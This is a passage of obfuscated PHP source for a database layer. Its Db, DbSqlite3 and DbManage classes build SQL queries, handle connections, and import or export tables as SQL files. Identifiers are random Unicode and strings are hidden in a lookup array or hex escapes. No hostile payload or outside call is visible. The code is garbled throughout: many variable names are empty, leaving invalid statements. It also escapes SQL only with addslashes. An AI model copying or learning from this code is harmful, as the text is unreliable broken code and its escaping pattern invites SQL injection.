isset($ė[$ٔ[1807]]) ? $ė[$ٔ[1807]] : null, $ٔ[1774] => isset($ė[$ٔ[1808]]) ? $ė[$ٔ[1808]] : null); $퓍[$ٔ[1775]] = isset($ė[$ٔ[1809]]) ? strtotime($ė[$ٔ[1809]]) : $퓍[$ٔ[1774]]; return $퓍; } protected function _isFolder($ë) { $ =& $_SERVER[ܮ]; if ($ë == $[12] || $ë == $[8]) { return !0; } $Ǧ = $this->_objectMeta($ë); return isset($Ǧ[$[33]]) && $Ǧ[$[33]] == $[78] ? !0 : !1; } } goto AĈ; D: class DbSqlite3 extends DbSqlite3Base { protected function _execSql($ߺ) { if (!$this->_linkID || !$ߺ) { return; } $this->_linkID->exec($ߺ); } protected function initConnectAfter() { $Ϫչ =& $_SERVER[ܮ]; $this->_execSql($Ϫչ[1125]); $this->_execSql($Ϫչ[1126]); } public function query($ߍȼ) { $꧝ = parent::query($ߍȼ); return $꧝; } public function execute($) { $ =& $_SERVER[ܮ]; if (!CacheLock::fileLock($[1127])) { return !1; } $ = parent::execute($); CacheLock::fileUnLock($[1127]); return $; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\156\x65\161" => "\74\76", "\147\164" => "\76", "\x65\x67\x74" => "\76\x3d", "\x6c\x74" => "\74", "\145\154\x74" => "\x3c\x3d", "\x6e\x6f\164\x6c\x69\153\x65" => "\x4e\117\x54\x20\x4c\x49\113\x45", "\154\151\x6b\145" => "\x4c\x49\x4b\x45", "\151\x6e" => "\111\116", "\x6e\157\x74\x69\x6e" => "\x4e\x4f\x54\40\x49\116", "\x6e\157\164\40\151\x6e" => "\x4e\117\x54\40\111\x4e", "\142\x65\x74\167\145\x65\156" => "\102\105\124\127\x45\105\x4e", "\x6e\157\x74\142\x65\x74\167\x65\145\x6e" => "\x4e\117\x54\x20\x42\105\x54\x57\105\x45\116", "\x6e\x6f\x74\40\x62\x65\x74\x77\x65\145\x6e" => "\x4e\x4f\124\x20\x42\105\124\127\105\105\x4e"); protected $selectSql = "\123\x45\x4c\105\x43\x54\x25\104\x49\x53\124\x49\x4e\x43\x54\45\40\45\x46\x49\105\x4c\x44\45\40\x46\x52\x4f\115\40\x25\x54\x41\102\x4c\x45\x25\45\112\117\111\116\x25\x25\x57\110\105\x52\105\x25\45\107\x52\x4f\125\120\45\x25\110\101\126\x49\x4e\x47\45\x25\117\122\104\105\x52\45\45\114\x49\x4d\111\124\45\40\x25\125\x4e\111\117\x4e\x25\45\x43\117\x4d\115\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $풢 = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ܮ][1128], $풢); } public function factory($ř = '') { $߀ =& $_SERVER[ܮ]; $ř = $this->parseConfig($ř); if (empty($ř[$߀[1129]])) { think_exception(think_lang($߀[1130])); } $this->dbType = ucwords(strtolower($ř[$߀[1129]])); $߸ = $߀[1131] . $this->dbType; if (class_exists($߸)) { $ = new $߸($ř); if ($߀[1132] != strtolower($ř[$߀[1129]])) { $->dbType = strtoupper($this->dbType); } else { $->dbType = $this->_getDsnType($ř[$߀[1081]]); } } else { think_exception(think_lang($߀[1133]) . $߀[1134] . $߸); } return $; } public function __call($ˑ䒖, $) { if (method_exists($this, $ˑ䒖)) { return call_user_func_array(array($this, $ˑ䒖), $); } } protected function _getDsnType($㭆) { $՛ę = explode($_SERVER[ܮ][4], $㭆); $Ğ = strtoupper(trim($՛ę[0])); return $Ğ; } private function parseConfig($ = '') { $ =& $_SERVER[ܮ]; if (!empty($) && is_string($)) { $ = $this->parseDSN($); } elseif (is_array($)) { $ = array_change_key_case($); $ = array($[1129] => $[$[1135]], $[1050] => $[$[1136]], $[1051] => $[$[1137]], $[1048] => $[$[1138]], $[1049] => $[$[1139]], $[21] => $[$[1140]], $[1081] => $[$[1141]], $[17] => isset($[$[1142]]) ? $[$[1142]] : array()); } elseif (empty($)) { if (think_config($[1143]) && $[1132] != strtolower(think_config($[1144]))) { $ = $this->parseDSN(think_config($[1143])); } else { $ = array($[1129] => think_config($[1144]), $[1050] => think_config($[1145]), $[1051] => think_config($[1146]), $[1048] => think_config($[1147]), $[1049] => think_config($[1148]), $[21] => think_config($[323]), $[1081] => think_config($[1143]), $[17] => think_config($[1149])); } } return $; } protected function initConnect($ַ = true) { if (1 == think_config($_SERVER[ܮ][22])) { $this->_linkID = $this->multiConnect($ַ); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } $this->initConnectAfter(); } protected function initConnectAfter() { } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ => $ۉ܈) { $this->_linkID = $ۉ܈; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($Ĩ = false) { $롺 =& $_SERVER[ܮ]; static $ߡ = array(); static $Ո = -1; if (empty($ߡ)) { foreach ($this->config as $ => $͖) { $ߡ[$] = explode($롺[50], $͖); } } if (think_config($롺[1150])) { if ($Ĩ || think_config($롺[486]) === !0) { $݆ = floor(mt_rand(0, think_config($롺[1151]) - 1)); $Ո = $݆; } else { if (is_numeric(think_config($롺[1152]))) { $݆ = think_config($롺[1152]); } else { $݆ = floor(mt_rand(think_config($롺[1151]), count($ߡ[$롺[1048]]) - 1)); } } } else { $݆ = floor(mt_rand(0, count($ߡ[$롺[1048]]) - 1)); $Ո = $݆; } $݆ = $Ո !== -1 ? $Ո : $݆; $ = array($롺[1050] => isset($ߡ[$롺[1050]][$݆]) ? $ߡ[$롺[1050]][$݆] : $ߡ[$롺[1050]][0], $롺[1051] => isset($ߡ[$롺[1051]][$݆]) ? $ߡ[$롺[1051]][$݆] : $ߡ[$롺[1051]][0], $롺[1048] => isset($ߡ[$롺[1048]][$݆]) ? $ߡ[$롺[1048]][$݆] : $ߡ[$롺[1048]][0], $롺[1049] => isset($ߡ[$롺[1049]][$݆]) ? $ߡ[$롺[1049]][$݆] : $ߡ[$롺[1049]][0], $롺[21] => isset($ߡ[$롺[21]][$݆]) ? $ߡ[$롺[21]][$݆] : $ߡ[$롺[21]][0], $롺[1081] => isset($ߡ[$롺[1081]][$݆]) ? $ߡ[$롺[1081]][$݆] : $ߡ[$롺[1081]][0], $롺[17] => isset($ߡ[$롺[17]][$݆]) ? $ߡ[$롺[17]][$݆] : $ߡ[$롺[17]][0]); return $this->connect($, $݆); } public function parseDSN($) { $ɖ =& $_SERVER[ܮ]; if (empty($)) { return !1; } $ = parse_url($); if ($[$ɖ[205]]) { $횜 = array($ɖ[1129] => $[$ɖ[205]], $ɖ[1050] => isset($[$ɖ[684]]) ? $[$ɖ[684]] : $ɖ[12], $ɖ[1051] => isset($[$ɖ[1153]]) ? $[$ɖ[1153]] : $ɖ[12], $ɖ[1048] => isset($[$ɖ[206]]) ? $[$ɖ[206]] : $ɖ[12], $ɖ[1049] => isset($[$ɖ[207]]) ? $[$ɖ[207]] : $ɖ[12], $ɖ[21] => isset($[$ɖ[87]]) ? substr($[$ɖ[87]], 1) : $ɖ[12]); } else { preg_match($ɖ[1154], trim($), $½); $횜 = array($ɖ[1129] => $½[1], $ɖ[1050] => $½[2], $ɖ[1051] => $½[3], $ɖ[1048] => $½[4], $ɖ[1049] => $½[5], $ɖ[21] => $½[6]); } $횜[$ɖ[1081]] = $ɖ[12]; return $횜; } protected function debug() { $ =& $_SERVER[ܮ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $[1155]; if (think_config($[1156])) { think_status($[1157]); think_trace($this->queryStr . $[1158] . think_status($[24], $[1157], 6) . $[1159], $[12], $[1160]); } } protected function parseLock($쏧 = false) { $ =& $_SERVER[ܮ]; if (!$쏧) { return $[12]; } if ($[1083] == $this->dbType) { return $[1161]; } return $[1162]; } protected function parseSet($Ζ) { $Ӓ =& $_SERVER[ܮ]; foreach ($Ζ as $ => $ڗ) { if (is_array($ڗ) && $Ӓ[372] == $ڗ[0]) { $Èν[] = $this->parseKey($) . $Ӓ[464] . $ڗ[1]; } elseif (is_scalar($ڗ) || is_null($ڗ)) { $Èν[] = $this->parseKey($) . $Ӓ[464] . $this->parseValue($ڗ); } } return $Ӓ[1163] . implode($Ӓ[50], $Èν); } protected function bindParam($, $ŗ) { $this->bind[$_SERVER[ܮ][4] . $] = $ŗ; } protected function parseBind($Ğ) { $Ğ = array_merge($this->bind, $Ğ); $this->bind = array(); return $Ğ; } function parseKey(&$Ú, $ޕ = true) { if ($ޕ) { $Ú = $this->parseKeyCheck($Ú); } return $Ú; } function parseKeyCheck($ԸΔ) { $ =& $_SERVER[ܮ]; $ԸΔ = trim($ԸΔ); if (!preg_match($[1164], $ԸΔ)) { think_exception($[1165] . $ԸΔ); } return $ԸΔ; } protected function parseValue($) { $ =& $_SERVER[ܮ]; if (is_string($)) { $ = $[1122] . $this->escapeString($) . $[1122]; } elseif (isset($[0]) && is_string($[0]) && strtolower($[0]) == $[372]) { $ = $this->escapeString($[1]); } elseif (is_array($)) { $ = array_map(array($this, $[1123]), $); } elseif (is_bool($)) { $ = $ ? $[91] : $[228]; } elseif (is_null($)) { $ = $[103]; } return $; } protected function parseField($܃) { $ܑ =& $_SERVER[ܮ]; if (is_string($܃) && strpos($܃, $ܑ[50])) { $܃ = explode($ܑ[50], $܃); } if (is_array($܃)) { $Ѱ = array(); foreach ($܃ as $٥ => $ǐ꽛) { if (!is_numeric($٥)) { $Ѱ[] = $this->parseKey($٥, !1) . $ܑ[1166] . $this->parseKey($ǐ꽛); } else { $Ѱ[] = $this->parseKey($ǐ꽛); } } $춳 = implode($ܑ[50], $Ѱ); } elseif (is_string($܃) && !empty($܃)) { $춳 = $܃; } else { $춳 = $ܑ[220]; } return $춳; } protected function parseTable($ӆ) { $ε =& $_SERVER[ܮ]; if (is_array($ӆ)) { $ή = array(); foreach ($ӆ as $ƽ => $) { if (!is_numeric($ƽ)) { $ή[] = $this->parseKey($ƽ) . $ε[53] . $this->parseKey($); } else { $ή[] = $this->parseKey($ƽ); } } $ӆ = $ή; } elseif (is_string($ӆ)) { if (strstr($ӆ, $ε[53])) { return $ӆ; } $ӆ = explode($ε[50], $ӆ); array_walk($ӆ, array($this, $ε[1068])); } return $ε[1062] . trim(implode($ε[1167], $ӆ), $ε[475]) . $ε[1062]; } protected function parseWhere($ݧ) { $ȝ =& $_SERVER[ܮ]; $ʒ = $ȝ[12]; if (is_string($ݧ)) { $ʒ = $ݧ; } else { $֓ = isset($ݧ[$ȝ[1168]]) ? strtoupper($ݧ[$ȝ[1168]]) : $ȝ[12]; if (in_array($֓, array($ȝ[1169], $ȝ[1170], $ȝ[1171]))) { $֓ = $ȝ[53] . $֓ . $ȝ[53]; unset($ݧ[$ȝ[1168]]); } else { $֓ = $ȝ[1172]; } foreach ($ݧ as $ؠ => $£) { $ʒ .= $ȝ[355]; if (is_numeric($ؠ)) { $ؠ = $ȝ[1173]; } if (0 === strpos($ؠ, $ȝ[11])) { $ʒ .= $this->parseThinkWhere($ؠ, $£); } else { if (!preg_match($ȝ[1174], trim($ؠ))) { think_exception(think_lang($ȝ[1175]) . $ȝ[4] . $ؠ); } $ = is_array($£) && isset($£[$ȝ[1176]]); $ؠ = trim($ؠ); if (strpos($ؠ, $ȝ[212])) { $ = explode($ȝ[212], $ؠ); $ = array(); foreach ($ as $̏ => $ß) { $ = $ ? $£[$̏] : $£; $[] = $ȝ[337] . $this->parseWhereItem($this->parseKey($ß), $) . $ȝ[1067]; } $ʒ .= implode($ȝ[1177], $); } elseif (strpos($ؠ, $ȝ[284])) { $ = explode($ȝ[284], $ؠ); $ = array(); foreach ($ as $̏ => $ß) { $ = $ ? $£[$̏] : $£; $[] = $ȝ[337] . $this->parseWhereItem($this->parseKey($ß), $) . $ȝ[1067]; } $ʒ .= implode($ȝ[1172], $); } else { $ʒ .= $this->parseWhereItem($this->parseKey($ؠ), $£); } } $ʒ .= $ȝ[356] . $֓; } $ʒ = substr($ʒ, 0, -strlen($֓)); } return empty($ʒ) ? $ȝ[12] : $ȝ[1178] . $ʒ; } protected function parseWhereItem($߀, $򇷛) { $梨 =& $_SERVER[ܮ]; $ݛ = $梨[12]; if (is_array($򇷛)) { if (is_string($򇷛[0])) { $򬑏 = strtolower($򇷛[0]); if (in_array($򇷛[0], array($梨[464], $梨[1179], $梨[1180], $梨[1181], $梨[1182], $梨[1183]))) { $ݛ .= $߀ . $梨[53] . $򇷛[0] . $梨[53] . $this->parseValue($򇷛[1]); } elseif (preg_match($梨[1184], $򇷛[0])) { $ݛ .= $߀ . $梨[53] . $this->exp[$򬑏] . $梨[53] . $this->parseValue($򇷛[1]); } elseif (preg_match($梨[1185], $򇷛[0])) { if (is_array($򇷛[1])) { $ó = isset($򇷛[2]) ? strtoupper($򇷛[2]) : $梨[1170]; if (in_array($ó, array($梨[1169], $梨[1170], $梨[1171]))) { $ = array(); foreach ($򇷛[1] as $畫) { $[] = $߀ . $梨[53] . $this->exp[$򬑏] . $梨[53] . $this->parseValue($畫); } $ݛ .= $梨[337] . implode($梨[53] . $ó . $梨[53], $) . $梨[1067]; } } else { $ݛ .= $߀ . $梨[53] . $this->exp[$򬑏] . $梨[53] . $this->parseValue($򇷛[1]); } } elseif ($梨[372] == $򬑏) { $ݛ .= $梨[1065] . $߀ . $梨[53] . $򇷛[1] . $梨[1186]; } elseif (preg_match($梨[1187], $򇷛[0])) { $ݛ .= $򇷛[0]; } elseif (preg_match($梨[1188], $򇷛[0])) { if (isset($򇷛[2]) && $梨[372] == $򇷛[2]) { $ݛ .= $߀ . $梨[53] . $this->exp[$򬑏] . $梨[53] . $򇷛[1]; } else { if (is_string($򇷛[1])) { $򇷛[1] = explode($梨[50], $򇷛[1]); } $ҦҒ = implode($梨[50], $this->parseValue($򇷛[1])); $ݛ .= $߀ . $梨[53] . $this->exp[$򬑏] . $梨[1065] . $ҦҒ . $梨[1067]; } } elseif (preg_match($梨[1189], $򇷛[0])) { $驎 = is_string($򇷛[1]) ? explode($梨[50], $򇷛[1]) : $򇷛[1]; $ݛ .= $梨[1065] . $߀ . $梨[53] . $this->exp[$򬑏] . $梨[53] . $this->parseValue($驎[0]) . $梨[1172] . $this->parseValue($驎[1]) . $梨[356]; } else { think_exception(think_lang($梨[1175]) . $梨[4] . $򇷛[0]); } } else { $δ = count($򇷛); $ = $梨[12]; if (is_string($򇷛[$δ - 1])) { $ = isset($򇷛[$δ - 1]) ? strtoupper($򇷛[$δ - 1]) : $梨[12]; if (in_array($, array($梨[1169], $梨[1170], $梨[1171]))) { $δ = $δ - 1; } } else { $ = $梨[1169]; } for ($ܠ = 0; $ܠ < $δ; $ܠ++) { $驎 = is_array($򇷛[$ܠ]) ? $򇷛[$ܠ][1] : $򇷛[$ܠ]; if ($梨[372] == strtolower($򇷛[$ܠ][0])) { $ݛ .= $梨[337] . $߀ . $梨[53] . $驎 . $梨[1186] . $ . $梨[53]; } else { $« = is_array($򇷛[$ܠ]) ? $this->exp[strtolower($򇷛[$ܠ][0])] : $梨[464]; if (!$« && is_array($򇷛[$ܠ]) && in_array($򇷛[$ܠ][0], array($梨[464], $梨[1179], $梨[1180], $梨[1181], $梨[1182], $梨[1183]))) { $« = $򇷛[$ܠ][0]; } $ݛ .= $梨[337] . $߀ . $梨[53] . $« . $梨[53] . $this->parseValue($驎) . $梨[1186] . $ . $梨[53]; } } $ݛ = substr($ݛ, 0, -4); } } else { $ݛ .= $߀ . $梨[1190] . $this->parseValue($򇷛); } return $ݛ; } protected function parseThinkWhere($䡝, $ל) { $ =& $_SERVER[ܮ]; $ӧ = $[12]; switch ($䡝) { case $[427]: $ӧ = $ל; break; case $[1173]: $ӧ = is_string($ל) ? $ל : substr($this->parseWhere($ל), 6); break; case $[1191]: parse_str($ל, $); if (isset($[$[1168]])) { $ = $[53] . strtoupper($[$[1168]]) . $[53]; unset($[$[1168]]); } else { $ = $[1172]; } $ё墫 = array(); foreach ($ as $ => $Ě) { $ё墫[] = $this->parseKey($) . $[1190] . $this->parseValue($Ě); } $ӧ = implode($, $ё墫); break; } return $ӧ; } protected function parseLimit($) { $ =& $_SERVER[ܮ]; return !empty($) ? $[51] . $ . $[53] : $[12]; } protected function parseJoin($) { $Đ =& $_SERVER[ܮ]; $ = $Đ[12]; if (!empty($)) { if (is_array($)) { foreach ($ as $߇ => $ڷ) { if (!1 !== stripos($ڷ, $Đ[1192])) { $ .= $Đ[53] . $ڷ; } else { $ .= $Đ[1193] . $ڷ; } } } else { $ .= $Đ[1193] . $; } } $ = preg_replace($Đ[1194], think_config($Đ[1095]) . $Đ[1195], $); return $; } protected function parseOrder($ҥ) { $׸ӡ =& $_SERVER[ܮ]; if (is_array($ҥ)) { $ҩ = array(); foreach ($ҥ as $ => $Δ) { if (is_numeric($)) { $ҩ[] = $this->parseKey($Δ); } else { $Δ = in_array(strtoupper(trim($Δ)), array($׸ӡ[1196], $׸ӡ[1197])) ? $׸ӡ[53] . $Δ : $׸ӡ[12]; if (preg_match($׸ӡ[1198], $)) { $ҩ[] = $this->parseKey($) . $Δ; } else { think_exception($׸ӡ[1199] . $); } } } $ҥ = implode($׸ӡ[50], $ҩ); } return !empty($ҥ) ? $׸ӡ[1200] . $ҥ : $׸ӡ[12]; } protected function parseGroup($ږ) { $ =& $_SERVER[ܮ]; return !empty($ږ) ? $[1201] . $ږ : $[12]; } protected function parseHaving($ܴ) { $԰ =& $_SERVER[ܮ]; return !empty($ܴ) ? $԰[1202] . $ܴ : $԰[12]; } protected function parseComment($Ѝ) { $ĉ =& $_SERVER[ܮ]; return !empty($Ѝ) ? $ĉ[1203] . $Ѝ . $ĉ[1204] : $ĉ[12]; } protected function parseDistinct($Φ) { $ۇ =& $_SERVER[ܮ]; return !empty($Φ) ? $ۇ[1205] : $ۇ[12]; } protected function parseUnion($) { $ٻ =& $_SERVER[ܮ]; if (empty($)) { return $ٻ[12]; } if (isset($[$ٻ[423]])) { $ = $ٻ[1206]; unset($[$ٻ[423]]); } else { $ = $ٻ[1207]; } foreach ($ as $) { $񍴝[] = $ . (is_array($) ? $this->buildSelectSql($) : $); } return implode($ٻ[53], $񍴝); } public function insert($, $ = array(), $ = false) { $Ô =& $_SERVER[ܮ]; $ = $ۉ = array(); $this->model = $[$Ô[359]]; foreach ($ as $𧻓ǒ => $ԣ) { if (is_array($ԣ) && $Ô[372] == $ԣ[0]) { $ۉ[] = $this->parseKey($𧻓ǒ); $[] = $ԣ[1]; } elseif (is_scalar($ԣ) || is_null($ԣ)) { $ۉ[] = $this->parseKey($𧻓ǒ); $[] = $this->parseValue($ԣ); } } $؟ = ($ ? $Ô[1069] : $Ô[1070]) . $Ô[1071] . $this->parseTable($[$Ô[357]]) . $Ô[1065] . implode($Ô[50], $ۉ) . $Ô[1066] . implode($Ô[50], $) . $Ô[1067]; $؟ .= $this->parseLock(isset($[$Ô[1006]]) ? $[$Ô[1006]] : !1); $؟ .= $this->parseComment(!empty($[$Ô[429]]) ? $[$Ô[429]] : $Ô[12]); return $this->execute($؟, $this->parseBind(!empty($[$Ô[361]]) ? $[$Ô[361]] : array())); } public function selectInsert($, $阥, $Ї = array()) { $ =& $_SERVER[ܮ]; $this->model = $Ї[$[359]]; if (is_string($)) { $ = explode($[50], $); } array_walk($, array($this, $[1068])); $ߏ߭ = $[1208] . $this->parseTable($阥) . $[1065] . implode($[50], $) . $[1186]; $ߏ߭ .= $this->buildSelectSql($Ї); return $this->execute($ߏ߭, $this->parseBind(!empty($Ї[$[361]]) ? $Ї[$[361]] : array())); } public function update($۾, $) { $ =& $_SERVER[ܮ]; $this->model = $[$[359]]; $ț = $[1209] . $this->parseTable($[$[357]]) . $this->parseSet($۾) . $this->parseWhere(!empty($[$[353]]) ? $[$[353]] : $[12]) . $this->parseOrder(!empty($[$[441]]) ? $[$[441]] : $[12]) . $this->parseLimit(!empty($[$[368]]) ? $[$[368]] : $[12]) . $this->parseLock(isset($[$[1006]]) ? $[$[1006]] : !1) . $this->parseComment(!empty($[$[429]]) ? $[$[429]] : $[12]); return $this->execute($ț, $this->parseBind(!empty($[$[361]]) ? $[$[361]] : array())); } public function delete($ = array()) { $ސ =& $_SERVER[ܮ]; $this->model = $[$ސ[359]]; $ = $ސ[1210] . $this->parseTable($[$ސ[357]]) . $this->parseWhere(!empty($[$ސ[353]]) ? $[$ސ[353]] : $ސ[12]) . $this->parseOrder(!empty($[$ސ[441]]) ? $[$ސ[441]] : $ސ[12]) . $this->parseLimit(!empty($[$ސ[368]]) ? $[$ސ[368]] : $ސ[12]) . $this->parseLock(isset($[$ސ[1006]]) ? $[$ސ[1006]] : !1) . $this->parseComment(!empty($[$ސ[429]]) ? $[$ސ[429]] : $ސ[12]); return $this->execute($, $this->parseBind(!empty($[$ސ[361]]) ? $[$ސ[361]] : array())); } public function select($ = array()) { $ =& $_SERVER[ܮ]; $this->model = $[$[359]]; $Ոܡ = $this->buildSelectSql($); $ = isset($[$[424]]) ? $[$[424]] : !1; if ($) { $ = is_string($[$[95]]) ? $[$[95]] : $[1211] . md5($Ոܡ); $Ɩ = think_cache($, $[12], $); if (!1 !== $Ɩ) { return $Ɩ; } } $橝 = $this->query($Ոܡ, $this->parseBind(!empty($[$[361]]) ? $[$[361]] : array())); if ($ && !1 !== $橝) { think_cache($, $橝, $); } return $橝; } public function buildSelectSql($ؚ = array()) { $ =& $_SERVER[ܮ]; if (isset($ؚ[$[428]])) { if (strpos($ؚ[$[428]], $[50])) { list($ւ߿, $ڂ첪) = explode($[50], $ؚ[$[428]]); } else { $ւ߿ = $ؚ[$[428]]; } $ւ߿ = $ւ߿ ? $ւ߿ : 1; $ڂ첪 = isset($ڂ첪) ? $ڂ첪 : (is_numeric($ؚ[$[368]]) ? $ؚ[$[368]] : 20); $ = $ڂ첪 * ((int) $ւ߿ - 1); $ؚ[$[368]] = $ . $[50] . $ڂ첪; } if (think_config($[1212])) { $ɚ = $[1213] . md5(serialize($ؚ)); $ތ = think_cache($ɚ); if ($ތ) { return $ތ; } } $㯌 = $this->parseSql($this->selectSql, $ؚ); $㯌 .= $this->parseLock(isset($ؚ[$[1006]]) ? $ؚ[$[1006]] : !1); if (isset($ɚ)) { think_cache($ɚ, $㯌); } return $㯌; } public function parseSql($յ, $┗ӗ = array()) { $ц =& $_SERVER[ܮ]; $յ = str_replace(array($ц[1214], $ц[1215], $ц[1216], $ц[1217], $ц[1218], $ц[1219], $ц[1220], $ц[1221], $ц[1222], $ц[1223], $ц[1224]), array($this->parseTable("{$┗ӗ[$ц[357]]}"), $this->parseDistinct(isset($┗ӗ[$ц[1225]]) ? $┗ӗ[$ц[1225]] : !1), $this->parseField(!empty($┗ӗ[$ц[351]]) ? $┗ӗ[$ц[351]] : $ц[220]), $this->parseJoin(!empty($┗ӗ[$ц[360]]) ? $┗ӗ[$ц[360]] : $ц[12]), $this->parseWhere(!empty($┗ӗ[$ц[353]]) ? $┗ӗ[$ц[353]] : $ц[12]), $this->parseGroup(!empty($┗ӗ[$ц[598]]) ? $┗ӗ[$ц[598]] : $ц[12]), $this->parseHaving(!empty($┗ӗ[$ц[1226]]) ? $┗ӗ[$ц[1226]] : $ц[12]), $this->parseOrder(!empty($┗ӗ[$ц[441]]) ? $┗ӗ[$ц[441]] : $ц[12]), $this->parseLimit(!empty($┗ӗ[$ц[368]]) ? $┗ӗ[$ц[368]] : $ц[12]), $this->parseUnion(!empty($┗ӗ[$ц[422]]) ? $┗ӗ[$ц[422]] : $ц[12]), $this->parseComment(!empty($┗ӗ[$ц[429]]) ? $┗ӗ[$ц[429]] : $ц[12])), $յ); return $յ; } public function getLastSql($ = '') { return $ ? $this->modelSql[$] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($) { return addslashes($); } public function setModel($) { $this->model = $; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { public $message = ''; function __construct($¸ = array()) { $ԛ =& $_SERVER[ܮ]; if (empty($¸)) { $¸ = $GLOBALS[$ԛ[6]][$ԛ[21]]; } $this->database = $¸; } public function model($πʨ = '') { return new ModelBase($πʨ, $_SERVER[ܮ][12], $this->database); } public function db($ = false) { $ =& $_SERVER[ܮ]; $Ģ = array_change_key_case($this->database); if ($this->dbType() == $[13] || !$) { return $this->model()->db(); } $ֹ = $Ģ[$[1140]]; $Ģ[$[1140]] = $[12]; if ($Ģ[$[1135]] == $[1132]) { $ = $Ģ[$[1141]]; $Ģ[$[1141]] = substr($, 0, strrpos($, $[1227])); } $this->database = $Ģ; $̟ = $this->model()->db(); $Ҝ = $̟->execute("\163\x68\x6f\x77\40\x64\x61\164\x61\142\141\x73\x65\x73\40\154\151\x6b\x65\x20\47{$ֹ}\x27"); if (!$Ҝ) { try { $̟->execute("\143\162\x65\141\x74\145\40\144\141\164\x61\x62\141\x73\x65\40\140{$ֹ}\x60"); } catch (Exception $) { $this->message = $->getMessage(); return !1; } } $Ģ[$[1140]] = $ֹ; if ($Ģ[$[1135]] == $[1132]) { $Ģ[$[1141]] .= $[1227] . $ֹ; } $this->database = $Ģ; try { $̟->execute("\x75\x73\145\x20\140{$ֹ}\x60"); } catch (Exception $) { $this->message = $->getMessage(); return !1; } return $̟; } public function createTable($, &$) { $ۡ尧 =& $_SERVER[ܮ]; if (!IO::exist($)) { show_json(LNG($ۡ尧[1228]), !1); } $ = $this->model()->db(); $ = IO::getContent($); $ = str_ireplace($ۡ尧[1229], $ۡ尧[1230], $); $ = sqlSplit($); foreach ($ as $Ӱé) { $ш = stripos($Ӱé, $ۡ尧[1231]) === 0; if ($ш) { $->task[$ۡ尧[1232]] += 1; } $->execute($Ӱé); if ($ш) { preg_match($ۡ尧[1233], $Ӱé, $򗥊); $->task[$ۡ尧[1234]] = $򗥊[1]; $->update(1); } } } public function insertTable($Ľ, &$ر) { $㼚 =& $_SERVER[ܮ]; $ = $this->model()->db(); $Ϛ = $̔ ? array($̔) : $->getTables(); foreach ($Ľ as $) { $̔ = basename($, $㼚[889]); if (!in_array($̔, $Ϛ)) { continue; } $ر->task[$㼚[1234]] = $̔; if ($̔ == $㼚[472]) { continue; } if (get_filesize($) == 0) { continue; } $ٿ = $this->sqlToDb($, $ر); if (!$ٿ) { show_json(LNG($㼚[1235]) . "\133{$̔}\135", !1); } } } public function sqlFromDb($, $޶, &$, $ = '') { $십 =& $_SERVER[ܮ]; if ($) { $->task[$십[1234]] = $; } $㟞 = $this->model($); $ = 0; $ = 0; $ׯ = 10000; $ϥ = fopen($޶, $십[1236]); $ƶ = $㟞->getPk(); $ͤ = $㟞->getDbFields(); $ɾ = $십[12]; if ($GLOBALS[$십[888]] && in_array($, array($십[1237], $십[1238]))) { $ɾ = $; } do { $䠄 = array($ƶ => array($십[1182], $)); $ = $㟞->where($䠄)->field($ͤ)->order($ƶ . $십[1239])->limit($ׯ)->select(); $ = !empty($) ? $ : array(); if (!($߿ѻ = count($))) { break; } $ڬ = end($); $ = $ڬ[$ƶ]; $ǧ = array(); foreach ($ as $) { if ($ɾ) { if ($ == $십[1237]) { if ($[$십[33]] == $십[1240]) { $ = json_decode($[$십[451]], !0); if ($[$십[32]] == $GLOBALS[$십[888]] && $[$십[848]] != 1) { continue; } } } else { if ($[$십[33]] == $십[1241] && $[$십[95]] == $십[884]) { continue; } } } $ǧ[] = $십[1242] . $this->sqlEncode($) . $십[1243]; } $ۡ³ = "\111\x4e\123\x45\122\124\x20\111\116\124\x4f\x20\140{$}\x60\40\x28\x60" . implode($십[1244], $ͤ) . $십[1245]; fwrite($ϥ, $ۡ³ . implode($십[1246], $ǧ) . $십[74] . PHP_EOL); $ += $߿ѻ; if ($) { $->update($߿ѻ); } } while ($ׯ == $߿ѻ); fclose($ϥ); return $; } public function sqlToDb($ۺ, &$) { $ =& $_SERVER[ܮ]; $ￇ = $this->model()->db(); $ё = @fopen($ۺ, $[1247]); if (!$ё) { return !1; } $߄ = 0; $Ǌ = $[12]; $ = array(); $ޥ = $this->dbType(); $ή = $ޥ == $[13] ? 500 : 2000; $ٓ = basename($ۺ, $[889]); $ޭ͎ = 0; $ِ = 4194304; while (!feof($ё)) { $皞 = trim(fgets($ё)); if (!$皞) { continue; } $܊ = $this->sqlDecode($皞, $ޥ, $ٓ); if (stripos($܊, $[430]) === 0) { if (!$Ǌ) { $Ǌ = $܊ . $[53]; } continue; } if ($) { $->task[$[1232]] += 1; } $߄++; $[] = rtrim(rtrim(trim($܊), $[50]), $[74]); $ = null; $ = strlen($܊); $ޭ͎ += $; $ = strlen($Ǌ) + $ޭ͎ + (count($) - 1); if ($ >= $ِ) { $ = array_pop($); if ($߄ > 1) { $߄--; } } if ($߄ >= $ή || $) { $܊ = $Ǌ . implode($[50], $); if (!$ￇ->execute($܊)) { return !1; } if ($) { $->update($߄); } $ = array(); $߄ = 0; $ޭ͎ = 0; if ($) { $ = array($); $߄ = 1; $ޭ͎ = $; } } } fclose($ё); if (!empty($)) { $܊ = $Ǌ . implode($[50], $); if (!$ￇ->execute($܊)) { return !1; } if ($) { $->update($߄); } } return !0; } public function dropTable($搩 = null) { $ߕ =& $_SERVER[ܮ]; $Җ = $this->model()->db(); $á = $搩 ? array($搩) : $Җ->getTables(); if (!$á) { return; } foreach ($á as $搩) { if ($搩) { $搩 = strtolower($搩); 